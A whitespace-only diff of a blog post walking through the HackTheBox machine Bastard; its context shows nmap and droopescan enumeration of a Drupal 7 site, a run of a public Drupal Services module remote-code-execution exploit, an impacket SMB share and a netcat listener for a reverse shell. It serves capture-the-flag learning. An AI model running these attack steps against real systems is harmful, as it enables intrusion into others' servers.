@@ -1,6 +1,6 @@
 ---
 title: "Walk-through of Bastard from HackTheBox"
-header: 
+header:
   teaser: /assets/images/2020-07-03-16-01-28.png
 toc: true
 toc_sticky: true
@@ -11,7 +11,7 @@ tags:
   - HTB
   - CTF
   - Drupal
-  - 
+  -
   - Windows
 ---
 
@@ -59,13 +59,13 @@ PORT      STATE SERVICE VERSION
 80/tcp    open  http    Microsoft IIS httpd 7.5
 |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
 |_http-generator: Drupal 7 (http://drupal.org)
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 | http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
 |_/LICENSE.txt /MAINTAINERS.txt
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9
@@ -92,7 +92,7 @@ root@kali:~/htb/bastard# git clone https://github.com/droope/droopescan.git
 root@kali:~/htb/bastard# cd droopescan
 root@kali:~/htb/bastard/droopescan# pip install -r requirements.txt
 root@kali:~/htb/bastard/droopescan# ./droopescan scan drupal -u 10.10.10.9
-[+] Themes found:                                                               
+[+] Themes found:
     seven http://10.10.10.9/themes/seven/
     garland http://10.10.10.9/themes/garland/
 [+] Possible interesting urls found:
@@ -185,11 +185,11 @@ $file = [
 Above are the sections to change. Now run exploit and test it worked:
 
 ```text
-root@kali:~/htb/bastard# php 41564.php 
+root@kali:~/htb/bastard# php 41564.php
 # Exploit Title: Drupal 7.x Services Module Remote Code Execution
 # Vendor Homepage: https://www.drupal.org/project/services
 # Exploit Author: Charles FOL
-# Contact: https://twitter.com/ambionics 
+# Contact: https://twitter.com/ambionics
 # Website: https://www.ambionics.io/blog/drupal-services-module-rce
 #!/usr/bin/php
 Stored session information in session.json
@@ -216,7 +216,7 @@ root@kali:~/htb/bastard# python /opt/impacket/examples/smbserver.py share /root/
 Grab rlwarap (useful to format output of NC better) then start a NC listening:
 
 ```text
-root@kali:~/htb/bastard# apt install rlwrap   
+root@kali:~/htb/bastard# apt install rlwrap
 root@kali:~/htb/machines/bastard# rlwrap nc -lnvp 443
 listening on [any] 443 ...
 ```
@@ -249,16 +249,16 @@ C:\inetpub\drupal-7.54>systeminfo
 systeminfo
 
 Host Name:                 BASTARD
-OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
 OS Version:                6.1.7600 N/A Build 7600
 OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Standalone Server
 OS Build Type:             Multiprocessor Free
 Registered Owner:          Windows User
-Registered Organization:   
+Registered Organization:
 Product ID:                00496-001-0001283-84782
-Original Install Date:     18/3/2017, 7:04:46   
-System Boot Time:          22/10/2019, 5:48:22   
+Original Install Date:     18/3/2017, 7:04:46
+System Boot Time:          22/10/2019, 5:48:22
 System Manufacturer:       VMware, Inc.
 System Model:              VMware Virtual Platform
 System Type:               x64-based PC
@@ -361,7 +361,7 @@ root@kali:~/htb/bastard# php 41564.php
 # Exploit Title: Drupal 7.x Services Module Remote Code Execution
 # Vendor Homepage: https://www.drupal.org/project/services
 # Exploit Author: Charles FOL
-# Contact: https://twitter.com/ambionics 
+# Contact: https://twitter.com/ambionics
 # Website: https://www.ambionics.io/blog/drupal-services-module-rce
 #!/usr/bin/php
 Stored session information in session.json
